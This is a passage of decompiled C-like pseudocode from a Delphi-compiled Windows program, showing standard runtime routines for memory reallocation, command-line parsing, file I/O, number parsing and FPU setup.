  if ( dword_42C610 > 15360 )
    sub_401EC0();
  v14 = 0;
  sub_403D78((unsigned int)ExceptionList, (int)v12, (int)v13);
  return v14;
}
// 42C045: using guessed type char byte_42C045;
// 42C5AC: using guessed type int dword_42C5AC;
// 42C5B0: using guessed type int dword_42C5B0;
// 42C5B8: using guessed type char byte_42C5B8;
// 42C5BC: using guessed type int dword_42C5BC;
// 42C610: using guessed type int dword_42C610;
// 42C614: using guessed type int dword_42C614;

//----- (0040244C) --------------------------------------------------------
unsigned int __usercall sub_40244C@<eax>(int a1@<eax>, int a2@<edx>)
{
  signed int v2; // esi
  unsigned int *v3; // ebp
  int v4; // edi
  _DWORD *v5; // eax
  _DWORD *v6; // ebx
  unsigned int result; // eax
  int v8; // [esp+0h] [ebp-18h]
  int v9; // [esp+0h] [ebp-18h]
  int v10; // [esp+0h] [ebp-18h]
  int v11; // [esp+4h] [ebp-14h]

  v2 = (a2 + 7) & 0xFFFFFFFC;
  if ( v2 < 12 )
    v2 = 12;
  v3 = (unsigned int *)(a1 - 4);
  v4 = *(_DWORD *)(a1 - 4) & 0x7FFFFFFC;
  v5 = (_DWORD *)(v4 + a1 - 4);
  v6 = v5;
  if ( v4 < v2 )
  {
    while ( 1 )
    {
      v11 = v2 - v4;
      if ( v6 == (_DWORD *)dword_42C614 )
      {
        if ( dword_42C610 >= v11 )
        {
          dword_42C610 -= v11;
          dword_42C614 += v11;
          if ( dword_42C610 < 12 )
          {
            dword_42C614 += dword_42C610;
            v2 += dword_42C610;
            dword_42C610 = 0;
          }
          dword_42C5B0 += v2 - v4;
          result = *v3 & 0x80000003;
          *v3 = result | v2;
          LOBYTE(result) = 1;
          return result;
        }
        sub_401EC0();
        v6 = (unsigned int *)((char *)v3 + v4);
      }
      if ( (*(_BYTE *)v6 & 2) == 0 )
      {
        v9 = v6[2];
        if ( v9 >= v11 )
        {
          sub_401BD0(v6);
          v10 = v9 - v11;
          if ( v10 < 12 )
          {
            v2 += v10;
            *(unsigned int *)((char *)v3 + v2) &= ~1u;
          }
          else
          {
            sub_401E38((unsigned int *)((char *)v3 + v2), v10);
          }
          goto LABEL_28;
        }
        v6 = (_DWORD *)((char *)v6 + v9);
        v11 -= v9;
      }
      if ( (int)*v6 >= 0 || !(unsigned __int8)sub_401FC4((char *)v6 + (*v6 & 0x7FFFFFFC), v11) )
        return 0;
      v6 = (unsigned int *)((char *)v3 + v4);
    }
  }
  v8 = v4 - v2;
  if ( v5 == (_DWORD *)dword_42C614 )
  {
    dword_42C614 -= v8;
    dword_42C610 += v8;
    if ( dword_42C610 < 12 )
    {
      dword_42C614 += v8;
      dword_42C610 -= v8;
      v2 = v4;
    }
  }
  else
  {
    if ( (*(_BYTE *)v5 & 2) == 0 )
    {
      v8 += v5[2];
      sub_401BD0(v5);
    }
    if ( v8 < 12 )
    {
      v2 = v4;
    }
    else
    {
      *(unsigned int *)((char *)v3 + v2) = v8 | 2;
      sub_401C94((int)v3 + v2 + 4);
    }
  }
LABEL_28:
  dword_42C5B0 += v2 - v4;
  result = *v3 & 0x80000003;
  *v3 = result | v2;
  LOBYTE(result) = 1;
  return result;
}
// 42C5B0: using guessed type int dword_42C5B0;
// 42C610: using guessed type int dword_42C610;
// 42C614: using guessed type int dword_42C614;

//----- (0040261C) --------------------------------------------------------
int __usercall sub_40261C@<eax>(char *a1@<eax>, int a2@<edx>)
{
  char *v4; // edi
  int v5; // eax
  unsigned int v7[2]; // [esp-Ch] [ebp-1Ch] BYREF
  int *v8; // [esp-4h] [ebp-14h]
  char *v9; // [esp+Ch] [ebp-4h]
  int savedregs; // [esp+10h] [ebp+0h] BYREF

  if ( !byte_42C5B8 && !sub_401A2C() )
    return 0;
  v8 = &savedregs;
  v7[1] = (unsigned int)&loc_4026CD;
  v7[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v7);
  if ( byte_42C045 )
    EnterCriticalSection(&CriticalSection);
  if ( (unsigned __int8)sub_40244C((int)a1, a2) )
  {
    v9 = a1;
  }
  else
  {
    v4 = (char *)sub_402118(a2);
    v5 = (*((_DWORD *)a1 - 1) & 0x7FFFFFFC) - 4;
    if ( a2 < v5 )
      v5 = a2;
    if ( v4 )
    {
      sub_402844(a1, v4, v5);
      sub_4022A8((int)a1);
    }
    v9 = v4;
  }
  __writefsdword(0, v7[0]);
  v8 = (int *)&loc_4026D4;
  if ( byte_42C045 )
    LeaveCriticalSection(&CriticalSection);
  return (int)v9;
}
// 42C045: using guessed type char byte_42C045;
// 42C5B8: using guessed type char byte_42C5B8;

//----- (004026E0) --------------------------------------------------------
int __usercall sub_4026E0@<eax>(int a1@<eax>)
{
  void *v1; // ecx
  int v2; // ebx

  if ( a1 <= 0 )
    return 0;
  v2 = off_42B02C();
  if ( !v2 )
    sub_4027E8(1, v1);
  return v2;
}
// 4026F3: variable 'v1' is possibly undefined
// 42B02C: using guessed type int (*off_42B02C)(void);

//----- (00402700) --------------------------------------------------------
int __usercall sub_402700@<eax>(int a1@<eax>)
{
  void *v1; // ecx
  int v2; // ebx

  if ( !a1 )
    return 0;
  v2 = off_42B030();
  if ( v2 )
    sub_4027E8(2, v1);
  return v2;
}
// 402713: variable 'v1' is possibly undefined
// 42B030: using guessed type int (*off_42B030)(void);

//----- (00402720) --------------------------------------------------------
_DWORD *__usercall sub_402720@<eax>(_DWORD *result@<eax>, int a2@<edx>)
{
  void *v2; // ecx
  void *v3; // ecx
  _DWORD *v4; // [esp-4h] [ebp-4h]
  _DWORD *v5; // [esp-4h] [ebp-4h]

  if ( *result )
  {
    if ( a2 )
    {
      result = (_DWORD *)off_42B034(result);
      v2 = v4;
      if ( result )
      {
        *v4 = result;
        return result;
      }
LABEL_8:
      sub_4027E8(1, v2);
    }
    *result = 0;
    result = (_DWORD *)off_42B030();
    if ( result )
      sub_4027E8(2, v3);
  }
  else if ( a2 )
  {
    result = (_DWORD *)off_42B02C(result);
    v2 = v5;
    if ( !result )
      goto LABEL_8;
    *v5 = result;
  }
  return result;
}
// 402733: variable 'v4' is possibly undefined
// 40273D: variable 'v3' is possibly undefined
// 402765: variable 'v5' is possibly undefined
// 42B02C: using guessed type int (__cdecl *off_42B02C)(_DWORD);
// 42B030: using guessed type int (*off_42B030)(void);
// 42B034: using guessed type int (__cdecl *off_42B034)(_DWORD);

//----- (00402770) --------------------------------------------------------
int sub_402770()
{
  if ( *(_DWORD *)sub_40656C() )
    return *(_DWORD *)(*(_DWORD *)sub_40656C() + 8);
  else
    return 0;
}

//----- (00402790) --------------------------------------------------------
void __usercall __noreturn sub_402790(int a1@<eax>, int a2@<edx>, void *a3@<ecx>)
{
  dword_42B004 = a2;
  sub_404254(a1, a3);
}
// 42B004: using guessed type int dword_42B004;

//----- (0040279C) --------------------------------------------------------
void __usercall __noreturn sub_40279C(char a1@<al>, int a2@<edx>, void *a3@<ecx>)
{
  int v4; // ebx

  LOBYTE(v4) = a1 & 0x7F;
  if ( dword_42C008 )
    dword_42C008(a3, a2);
  if ( (_BYTE)v4 )
  {
    if ( (unsigned __int8)v4 <= 0x18u )
      LOBYTE(v4) = byte_42B038[(unsigned __int8)v4];
  }
  else
  {
    v4 = *((_DWORD *)sub_40656C() + 1);
  }
  sub_402790((unsigned __int8)v4, a2, a3);
}
// 4027DE: variable 'a3' is possibly undefined
// 42C008: using guessed type int (__fastcall *dword_42C008)(_DWORD, _DWORD);

//----- (004027E8) --------------------------------------------------------
void __usercall __noreturn sub_4027E8(char a1@<al>, void *a2@<ecx>)
{
  int retaddr; // [esp+0h] [ebp+0h]

  sub_40279C(a1 & 0x7F, retaddr, a2);
}

//----- (004027F4) --------------------------------------------------------
void __thiscall __spoils<ecx> sub_4027F4(void *this)
{
  if ( *((_DWORD *)sub_40656C() + 1) )
    sub_4027E8(0, this);
}

//----- (00402814) --------------------------------------------------------
_DWORD *__usercall sub_402814@<eax>(int a1@<eax>)
{
  _DWORD *result; // eax

  result = sub_40656C();
  result[1] = a1;
  return result;
}

//----- (00402824) --------------------------------------------------------
int sub_402824()
{
  int v0; // ebx

  v0 = *((_DWORD *)sub_40656C() + 1);
  *((_DWORD *)sub_40656C() + 1) = 0;
  return v0;
}

//----- (00402844) --------------------------------------------------------
int __usercall sub_402844@<eax>(char *a1@<eax>, char *a2@<edx>, int a3@<ecx>)
{
  int result; // eax
  int v5; // ecx
  char *v6; // esi
  char *v7; // edi
  int v8; // ecx
  int v9; // ecx
  _BYTE *v10; // esi
  _BYTE *v11; // edi

  result = a3;
  if ( a2 > a1 )
  {
    v6 = &a1[a3 - 4];
    v7 = &a2[a3 - 4];
    v8 = a3 >> 2;
    if ( v8 >= 0 )
    {
      while ( v8 )
      {
        *(_DWORD *)v7 = *(_DWORD *)v6;
        v6 -= 4;
        v7 -= 4;
        --v8;
      }
      v9 = result & 3;
      v10 = v6 + 3;
      v11 = v7 + 3;
      while ( v9 )
      {
        *v11-- = *v10--;
        --v9;
      }
    }
  }
  else if ( a2 != a1 )
  {
    v5 = a3 >> 2;
    if ( v5 >= 0 )
      qmemcpy(a2, a1, 4 * v5 + (result & 3));
  }
  return result;
}

//----- (00402884) --------------------------------------------------------
const CHAR *__usercall sub_402884@<eax>(LPSTR i@<eax>, char **a2@<edx>)
{
  int v4; // ebp
  const CHAR *v5; // edi
  LPSTR v6; // eax
  LPSTR v7; // eax
  const CHAR *v8; // ebx
  char *v9; // edi
  int v10; // esi
  LPSTR j; // eax
  LPSTR k; // eax

  while ( 1 )
  {
    while ( *i && (unsigned __int8)*i <= 0x20u )
      i = CharNextA(i);
    if ( *i != 34 || i[1] != 34 )
      break;
    i += 2;
  }
  v4 = 0;
  v5 = i;
  while ( (unsigned __int8)*i > 0x20u )
  {
    if ( *i == 34 )
    {
      for ( i = CharNextA(i); *i && *i != 34; i = v6 )
      {
        v6 = CharNextA(i);
        v4 += v6 - i;
      }
      if ( *i )
        i = CharNextA(i);
    }
    else
    {
      v7 = CharNextA(i);
      v4 += v7 - i;
      i = v7;
    }
  }
  sub_40484C(a2, v4);
  v8 = v5;
  v9 = *a2;
  v10 = 0;
  while ( *v8 > 0x20u )
  {
    if ( *v8 == 34 )
    {
      v8 = CharNextA(v8);
      while ( *v8 && *v8 != 34 )
      {
        for ( j = CharNextA(v8); j > v8; ++v10 )
          v9[v10] = *v8++;
      }
      if ( *v8 )
        v8 = CharNextA(v8);
    }
    else
    {
      for ( k = CharNextA(v8); k > v8; ++v10 )
        v9[v10] = *v8++;
    }
  }
  return v8;
}

//----- (00402970) --------------------------------------------------------
int sub_402970()
{
  int v0; // esi
  CHAR *CommandLineA; // eax
  CHAR *v2; // ebx
  unsigned int v4[2]; // [esp-14h] [ebp-18h] BYREF
  int *v5; // [esp-Ch] [ebp-10h]
  char *v6; // [esp+0h] [ebp-4h] BYREF
  int savedregs; // [esp+4h] [ebp+0h] BYREF

  v6 = 0;
  v5 = &savedregs;
  v4[1] = (unsigned int)&loc_4029C1;
  v4[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v4);
  v0 = 0;
  CommandLineA = GetCommandLineA();
  v2 = (CHAR *)sub_402884(CommandLineA, &v6);
  while ( 1 )
  {
    v2 = (CHAR *)sub_402884(v2, &v6);
    if ( !v6 )
      break;
    ++v0;
  }
  __writefsdword(0, v4[0]);
  v5 = (int *)&loc_4029C8;
  sub_40426C(&v6);
  return v0;
}

//----- (004029D0) --------------------------------------------------------
const CHAR *__usercall sub_4029D0@<eax>(int a1@<eax>, char **a2@<edx>)
{
  int ModuleFileNameA; // eax
  const CHAR *result; // eax
  CHAR *CommandLineA; // edi
  CHAR Filename[276]; // [esp+0h] [ebp-114h] BYREF

  sub_40426C(a2);
  if ( a1 )
  {
    CommandLineA = GetCommandLineA();
    while ( 1 )
    {
      result = sub_402884(CommandLineA, a2);
      CommandLineA = (CHAR *)result;
      if ( !a1 || !*a2 )
        break;
      --a1;
    }
  }
  else
  {
    ModuleFileNameA = GetModuleFileNameA(0, Filename, 0x105u);
    return (const CHAR *)sub_40435C(a2, Filename, ModuleFileNameA);
  }
  return result;
}

//----- (00402A30) --------------------------------------------------------
unsigned __int8 __usercall sub_402A30@<al>(unsigned __int8 result@<al>)
{
  if ( result >= 0x61u && result <= 0x7Au )
    result -= 32;
  return result;
}

//----- (00402A3C) --------------------------------------------------------
__int64 __usercall sub_402A3C@<edx:eax>(double a1@<st0>)
{
  return (__int64)a1;
}

//----- (00402A48) --------------------------------------------------------
void __noreturn sub_402A48()
{
  if ( dword_42C028 )
    dword_42C028();
  sub_404260();
}
// 402A48: using guessed type void __noreturn sub_402A48();
// 404260: using guessed type void __noreturn sub_404260(void);
// 42C028: using guessed type int (*dword_42C028)(void);

//----- (00402A64) --------------------------------------------------------
int __usercall sub_402A64@<eax>(int a1@<eax>, __int16 a2@<dx>)
{
  unsigned __int16 v4; // ax
  int v5; // ebx

  v4 = *(_WORD *)(a1 + 4);
  if ( v4 >= 0xD7B0u && v4 <= 0xD7B3u )
  {
    if ( v4 != 0xD7B0 )
      sub_402D80(a1);
    *(_WORD *)(a1 + 4) = a2;
    if ( !*(_BYTE *)(a1 + 72) && !*(_DWORD *)(a1 + 24) )
      *(_DWORD *)(a1 + 24) = sub_402B74;
    v5 = (*(int (**)(void))(a1 + 24))();
  }
  else
  {
    v5 = 102;
  }
  if ( v5 )
    sub_402814(v5);
  return v5;
}
// 402B74: using guessed type int sub_402B74();

//----- (00402ABC) --------------------------------------------------------
int __usercall sub_402ABC@<eax>(int a1@<eax>)
{
  return sub_402A64(a1, 55218);
}

//----- (00402AC8) --------------------------------------------------------
DWORD __usercall sub_402AC8@<eax>(int a1@<eax>)
{
  DWORD result; // eax

  *(_DWORD *)(a1 + 16) = 0;
  *(_DWORD *)(a1 + 12) = 0;
  if ( ReadFile(*(HANDLE *)a1, *(LPVOID *)(a1 + 20), *(_DWORD *)(a1 + 8), (LPDWORD)(a1 + 16), 0) )
    return 0;
  result = GetLastError();
  if ( result == 109 )
    return 0;
  return result;
}

//----- (00402B04) --------------------------------------------------------
int sub_402B04()
{
  return 0;
}

//----- (00402B08) --------------------------------------------------------
DWORD __usercall sub_402B08@<eax>(int a1@<eax>, DWORD a2@<ecx>)
{
  DWORD v3; // esi
  DWORD result; // eax
  DWORD NumberOfBytesWritten; // [esp+0h] [ebp-Ch] BYREF

  NumberOfBytesWritten = a2;
  v3 = *(_DWORD *)(a1 + 12);
  if ( !v3 )
    return 0;
  if ( WriteFile(*(HANDLE *)a1, *(LPCVOID *)(a1 + 20), v3, &NumberOfBytesWritten, 0) )
    result = 0;
  else
    result = GetLastError();
  *(_DWORD *)(a1 + 12) = 0;
  return result;
}

//----- (00402B44) --------------------------------------------------------
bool __usercall sub_402B44@<al>(void *a1@<eax>)
{
  return CloseHandle(a1);
}

//----- (00402B54) --------------------------------------------------------
DWORD __usercall sub_402B54@<eax>(int a1@<eax>)
{
  *(_WORD *)(a1 + 4) = -10320;
  if ( sub_402B44(*(void **)a1) )
    return 0;
  else
    return GetLastError();
}

//----- (00402D20) --------------------------------------------------------
int __usercall sub_402D20@<eax>(int a1@<eax>, int (__thiscall *a2)(int)@<edx>, int a3@<ecx>)
{
  bool v3; // cf
  int v4; // ecx
  int v5; // ebx

  if ( *(_WORD *)(a1 + 4) == 0xD7B1 )
  {
    v5 = 0;
  }
  else
  {
    LOWORD(a3) = *(_WORD *)(a1 + 4) + 10319;
    v4 = a3 - 1;
    v3 = (unsigned __int16)v4 < 2u;
    LOWORD(v4) = v4 - 2;
    if ( v3 )
    {
      v5 = a2(v4);
    }
    else if ( (_UNKNOWN *)a1 == &unk_42C214 || (_UNKNOWN *)a1 == &unk_42C3E0 )
    {
      v5 = 0;
    }
    else
    {
      v5 = 103;
    }
  }
  if ( v5 )
    sub_402814(v5);
  return v5;
}

//----- (00402D68) --------------------------------------------------------
int __usercall sub_402D68@<eax>(int a1@<eax>, int a2@<ecx>)
{
  return sub_402D20(a1, *(int (__thiscall **)(int))(a1 + 28), a2);
}

//----- (00402D74) --------------------------------------------------------
int __usercall sub_402D74@<eax>(int a1@<eax>, int a2@<ecx>)
{
  return sub_402D20(a1, *(int (__thiscall **)(int))(a1 + 32), a2);
}

//----- (00402D80) --------------------------------------------------------
int __usercall sub_402D80@<eax>(int a1@<eax>)
{
  int v2; // esi
  unsigned __int16 v3; // ax

  v2 = 0;
  v3 = *(_WORD *)(a1 + 4);
  if ( v3 < 0xD7B1u || v3 > 0xD7B3u )
  {
    if ( (_UNKNOWN *)a1 != &unk_42C048 )
      sub_402814(103);
  }
  else
  {
    if ( (v3 & 0xD7B2) == 0xD7B2 )
      v2 = (*(int (**)(void))(a1 + 28))();
    if ( !v2 )
      v2 = (*(int (**)(void))(a1 + 36))();
    if ( v2 )
      sub_402814(v2);
  }
  return v2;
}

//----- (00402DD8) --------------------------------------------------------
int __usercall sub_402DD8@<eax>(int result@<eax>, int a2@<edx>, unsigned int a3@<ecx>)
{
  unsigned int v3; // esi
  unsigned int v4; // esi

  v3 = a3 >> 2;
  if ( a3 >> 2 )
  {
    while ( *(_DWORD *)result == *(_DWORD *)a2 )
    {
      v4 = v3 - 1;
      if ( !v4 )
      {
        result += 4;
        a2 += 4;
        goto LABEL_8;
      }
      if ( *(_DWORD *)(result + 4) != *(_DWORD *)(a2 + 4) )
        return result;
      result += 8;
      a2 += 8;
      v3 = v4 - 1;
      if ( !v3 )
        goto LABEL_8;
    }
  }
  else
  {
LABEL_8:
    if ( (a3 & 3) != 0
      && *(_BYTE *)result == *(_BYTE *)a2
      && ((a3 & 3) == 1
       || *(_BYTE *)(result + 1) == *(_BYTE *)(a2 + 1)
       && ((a3 & 3) == 2 || *(_BYTE *)(result + 2) == *(_BYTE *)(a2 + 2))) )
    {
      return 0;
    }
  }
  return result;
}

//----- (00402E48) --------------------------------------------------------
__int16 __usercall sub_402E48@<ax>(char *a1@<eax>, int a2@<edx>, int a3@<ecx>)
{
  int v4; // eax
  int v5; // ecx

  BYTE1(a3) = a3;
  v4 = a3 << 16;
  LOWORD(v4) = a3;
  v5 = a2 >> 2;
  if ( a2 >> 2 >= 0 )
  {
    memset32(a1, v4, v5);
    memset(&a1[4 * v5], v4, a2 & 3);
  }
  return v4;
}

//----- (00402E68) --------------------------------------------------------
int __usercall sub_402E68@<eax>(int result@<eax>, char **a2@<edx>)
{
  char *v2; // esi
  int v3; // ebx
  char v4; // bl
  char v5; // ch
  char *v6; // esi
  unsigned __int8 v7; // bl
  unsigned __int8 v8; // bl
  int v9; // [esp-4h] [ebp-10h]

  v2 = (char *)result;
  v9 = result;
  if ( result )
  {
    result = 0;
    v3 = 0;
    do
      v4 = *v2++;
    while ( v4 == 32 );
    v5 = 0;
    switch ( v4 )
    {
      case '-':
        v5 = 1;
        break;
      case '+':
        break;
      case '$':
      case 'x':
      case 'X':
LABEL_27:
        v7 = *v2++;
        if ( v7 )
        {
          while ( 1 )
          {
            if ( v7 >= 0x61u )
              v7 -= 32;
            LOBYTE(v3) = v7 - 48;
            if ( (unsigned __int8)v3 > 9u )
            {
              v8 = v3 - 17;
              if ( v8 > 5u )
                goto LABEL_24;
              LOBYTE(v3) = v8 + 10;
            }
            if ( (unsigned int)result > 0xFFFFFFF )
              goto LABEL_24;
            result = v3 + 16 * result;
            v7 = *v2++;
            if ( !v7 )
              goto LABEL_35;
          }
        }
        goto LABEL_21;
      case '0':
        v4 = *v2++;
        if ( v4 != 120 && v4 != 88 )
        {
          if ( v4 )
            goto LABEL_15;
LABEL_18:
          if ( v5 == 1 )
          {
            result = -result;
            if ( result >= 1 && result != 0 && result >= 0 )
              goto LABEL_24;
          }
          else if ( result < 0 )
          {
            goto LABEL_24;
          }
LABEL_35:
          v6 = 0;
          goto LABEL_36;
        }
        goto LABEL_27;
      default:
LABEL_14:
        if ( v4 )
        {
LABEL_15:
          while ( 1 )
          {
            LOBYTE(v3) = v4 - 48;
            if ( (unsigned __int8)v3 > 9u || (unsigned int)result > 0xCCCCCCC )
              break;
            result = v3 + 10 * result;
            v4 = *v2++;
            if ( !v4 )
              goto LABEL_18;
          }
        }
        goto LABEL_24;
    }
    v4 = *v2++;
    goto LABEL_14;
  }
LABEL_21:
  ++v2;
LABEL_24:
  v6 = &v2[-v9];
LABEL_36:
  *a2 = v6;
  return result;
}

//----- (00402F34) --------------------------------------------------------
int __usercall sub_402F34@<eax>(int a1@<eax>)
{
  int v1; // ebx
  int v2; // ebx

  v1 = a1;
  if ( (_UNKNOWN *)a1 == &unk_42C214 || (_UNKNOWN *)a1 == &unk_42C3E0 )
  {
    *(_WORD *)(a1 + 6) = (unsigned __int8)byte_42B020;
    a1 = sub_402ABC(a1);
  }
  LOBYTE(a1) = *(_WORD *)(v1 + 4) == 0xD7B2;
  v2 = a1;
  if ( !(_BYTE)a1 )
    sub_402814(105);
  return v2;
}
// 42B020: using guessed type char byte_42B020;

//----- (00402F78) --------------------------------------------------------
int __usercall sub_402F78@<eax>(int result@<eax>, char *a2@<edx>, signed int a3@<ecx>)
{
  bool v4; // zf
  char *v5; // edi
  signed int v6; // edx
  int v7; // eax
  signed int v8; // [esp-Ch] [ebp-14h]
  signed int v9; // [esp-8h] [ebp-10h]
  int v10; // [esp-4h] [ebp-Ch]
  int v11; // [esp-4h] [ebp-Ch]

  if ( *(_WORD *)(result + 4) == 0xD7B2
    || (v10 = result, v8 = a3, v4 = (unsigned __int8)sub_402F34(result) == 0, a3 = v8, result = v10, !v4) )
  {
    while ( 1 )
    {
      v5 = (char *)(*(_DWORD *)(result + 12) + *(_DWORD *)(result + 20));
      v6 = *(_DWORD *)(result + 8) - *(_DWORD *)(result + 12);
      if ( v6 > a3 )
        break;
      *(_DWORD *)(result + 12) = *(_DWORD *)(result + 8);
      qmemcpy(v5, a2, v6);
      a2 += v6;
      v7 = (*(int (__cdecl **)(int, int))(result + 28))(a3 - v6, result);
      if ( v7 )
      {
        sub_402814(v7);
        return v11;
      }
      a3 = v9;
      result = v11;
    }
    *(_DWORD *)(result + 12) += a3;
    qmemcpy(v5, a2, a3);
  }
  return result;
}
// 402FB5: variable 'v9' is possibly undefined
// 402FB6: variable 'v11' is possibly undefined

//----- (00402FCC) --------------------------------------------------------
int __usercall sub_402FCC@<eax>(int result@<eax>, signed int a2@<edx>)
{
  signed int v3; // [esp-8h] [ebp-8h]
  int v4; // [esp-4h] [ebp-4h]

  while ( a2 > 64 )
  {
    v4 = result;
    v3 = a2 - 64;
    sub_402F78(result, (char *)dword_402FFC, 64);
    if ( *((_DWORD *)sub_40656C() + 1) )
      return v4;
    a2 = v3;
    result = v4;
  }
  if ( a2 > 0 )
    return sub_402F78(result, (char *)dword_402FFC, a2);
  return result;
}
// 402FFC: using guessed type int dword_402FFC[16];

//----- (00403048) --------------------------------------------------------
int __usercall sub_403048@<eax>(_BYTE *a1@<eax>, char *a2@<edx>)
{
  return sub_403054(a1, a2, 0xFFu);
}

//----- (00403054) --------------------------------------------------------
int __usercall sub_403054@<eax>(_BYTE *a1@<eax>, char *a2@<edx>, unsigned int a3@<ecx>)
{
  char v3; // bl
  int result; // eax
  _BYTE *v5; // [esp-4h] [ebp-8h]

  v5 = a1;
  if ( a3 > 0xFF )
    a3 = 255;
  do
  {
    v3 = *a2++;
    if ( !v3 )
      break;
    *++a1 = v3;
    --a3;
  }
  while ( a3 );
  result = a1 - v5;
  *v5 = result;
  return result;
}

//----- (00403078) --------------------------------------------------------
const void *__usercall sub_403078@<eax>(const void *result@<eax>, const void *a2@<edx>, unsigned __int8 a3@<cl>)
{
  memcmp(result, a2, a3);
  return result;
}

//----- (00403094) --------------------------------------------------------
int __usercall sub_403094@<eax>(int result@<eax>)
{
  _EBX = 0;
  if ( result < 0 )
  {
    result = -result;
    if ( result >= 5120 )
    {
      __asm { fldz }
    }
    else
    {
      _EDX = 5 * (result & 0x1F);
      __asm
      {
        fld     tbyte_403143[ebx+edx*2]
        fdivp   st(1), st
      }
      result = (unsigned int)result >> 5;
      if ( result )
      {
        if ( (result & 0xF) != 0 )
        {
          _EDX = 5 * (result & 0xF);
          __asm
          {
            fld     tbyte_403279[ebx+edx*2]
            fdivp   st(1), st
          }
        }
        result = (unsigned int)result >> 4;
        if ( result )
        {
          result *= 5;
          __asm
          {
            fld     tbyte_40330F[ebx+eax*2]
            fdivp   st(1), st
          }
        }
      }
    }
  }
  else if ( result )
  {
    if ( result >= 5120 )
    {
      __asm { fld     tbyte_403139[ebx] }
    }
    else
    {
      _EDX = 5 * (result & 0x1F);
      __asm
      {
        fld     tbyte_403143[ebx+edx*2]
        fmulp   st(1), st
      }
      result = (unsigned int)result >> 5;
      if ( result )
      {
        if ( (result & 0xF) != 0 )
        {
          _EDX = 5 * (result & 0xF);
          __asm
          {
            fld     tbyte_403279[ebx+edx*2]
            fmulp   st(1), st
          }
        }
        result = (unsigned int)result >> 4;
        if ( result )
        {
          result *= 5;
          __asm
          {
            fld     tbyte_40330F[ebx+eax*2]
            fmulp   st(1), st
          }
        }
      }
    }
  }
  return result;
}
// 4030B4: inconsistent fpu stack

//----- (0040337C) --------------------------------------------------------
int sub_40337C()
{
  int v0; // ebx
  int v1; // eax

  v0 = 0;
  if ( GetKeyboardType(0) == 7 )
  {
    v1 = GetKeyboardType(1) & 0xFF00;
    if ( v1 == 3328 || v1 == 1024 )
      LOBYTE(v0) = 1;
  }
  return v0;
}

//----- (004033AC) --------------------------------------------------------
__int16 sub_4033AC()
{
  __int16 result; // ax
  unsigned int v1[2]; // [esp-Ch] [ebp-18h] BYREF
  int *v2; // [esp-4h] [ebp-10h]
  DWORD cbData; // [esp+0h] [ebp-Ch] BYREF
  BYTE Data[4]; // [esp+4h] [ebp-8h] BYREF
  HKEY phkResult; // [esp+8h] [ebp-4h] BYREF
  int savedregs; // [esp+Ch] [ebp+0h] BYREF

  *(_DWORD *)Data = (unsigned __int16)word_42B00C;
  if ( !RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Borland\\Delphi\\RTL", 0, 1u, &phkResult) )
  {
    v2 = &savedregs;
    v1[1] = (unsigned int)sub_40341D;
    v1[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)v1);
    cbData = 4;
    RegQueryValueExA(phkResult, "FPUMaskValue", 0, 0, Data, &cbData);
    __writefsdword(0, v1[0]);
    v2 = (int *)&loc_403424;
    RegCloseKey(phkResult);
  }
  result = Data[0] & 0x3F | word_42B00C & 0xFFC0;
  word_42B00C = result;
  return result;
}
// 40341D: using guessed type int __cdecl sub_40341D(int, int);
// 42B00C: using guessed type __int16 word_42B00C;

//----- (00403470) --------------------------------------------------------
void sub_403470()
{
  __asm { fninit }
}

//----- (0040347C) --------------------------------------------------------
int __usercall sub_40347C@<eax>(int a1@<eax>)
{
  return *(_DWORD *)a1;
}

//----- (00403484) --------------------------------------------------------
int __usercall sub_403484@<eax>(int result@<eax>, void *a2@<edx>)
{
  qmemcpy(a2, *(const void **)(result - 44), **(unsigned __int8 **)(result - 44) + 1);
  return result;
}

//----- (00403498) --------------------------------------------------------
char __usercall sub_403498@<al>(int a1@<eax>, int a2@<edx>)
{
  char v2; // bl
  unsigned __int8 *v3; // eax
  int v4; // ecx
  int v5; // edx

  v2 = 0;
  if ( a2 )
  {
    v3 = *(unsigned __int8 **)(a1 - 44);
    v4 = *v3;
    if ( v4 == *(_DWORD *)(a2 - 4) )
    {
      v5 = a2 - 1;
      while ( ((*(_BYTE *)(v4 + v5) ^ v3[v4]) & 0xDF) == 0 )
      {
        if ( !--v4 )
          return 1;
      }
    }
  }
  return v2;
}

//----- (004034C0) --------------------------------------------------------
int __usercall sub_4034C0@<eax>(int a1@<eax>)
{
  int result; // eax

  result = *(_DWORD *)(a1 - 36);
  if ( result )
    return *(_DWORD *)result;
  return result;
}

//----- (004034CC) --------------------------------------------------------
_DWORD *__usercall sub_4034CC@<eax>(int a1@<eax>)
{
  int v2; // eax
  _DWORD *v3; // eax

  v2 = sub_4034FC(a1);
  v3 = (_DWORD *)sub_4026E0(v2);
  return sub_403540(a1, v3);
}

//----- (004034E8) --------------------------------------------------------
int __usercall sub_4034E8@<eax>(int a1@<eax>)
{
  sub_403598(a1);
  return sub_402700(a1);
}

//----- (004034FC) --------------------------------------------------------
int __usercall sub_4034FC@<eax>(int a1@<eax>)
{
  return *(_DWORD *)(a1 - 40);
}

//----- (00403504) --------------------------------------------------------
_DWORD *__usercall sub_403504@<eax>(_DWORD *result@<eax>, char a2@<dl>)
{
  char v2; // [esp-10h] [ebp-10h]

  if ( a2 )
    result = (_DWORD *)sub_403864((int)result, a2, v2);
  if ( a2 )
    return sub_4038BC(result);
  return result;
}
// 40350B: variable 'v2' is possibly undefined
// 403512: variable 'a2' is possibly undefined

//----- (00403524) --------------------------------------------------------
_DWORD *__usercall sub_403524@<eax>(_DWORD *a1@<eax>, char a2@<dl>)
{
  _DWORD *result; // eax
  char v3; // dl

  result = sub_4038CC(a1, a2);
  if ( v3 > 0 )
    return (_DWORD *)sub_4038B4(result);
  return result;
}
// 40352B: variable 'v3' is possibly undefined

//----- (00403534) --------------------------------------------------------
_DWORD *__usercall sub_403534@<eax>(_DWORD *result@<eax>)
{
  if ( result )
    return (_DWORD *)(*(int (**)(void))(*result - 4))();
  return result;
}

//----- (00403540) --------------------------------------------------------
_DWORD *__usercall sub_403540@<eax>(int a1@<eax>, _DWORD *a2@<edx>)
{
  int v2; // ebx
  _DWORD *result; // eax
  int *v4; // ebx
  int v5; // ecx
  _DWORD *v6; // ebx
  int v7; // esi
  unsigned int v8; // [esp-4h] [ebp-10h] BYREF
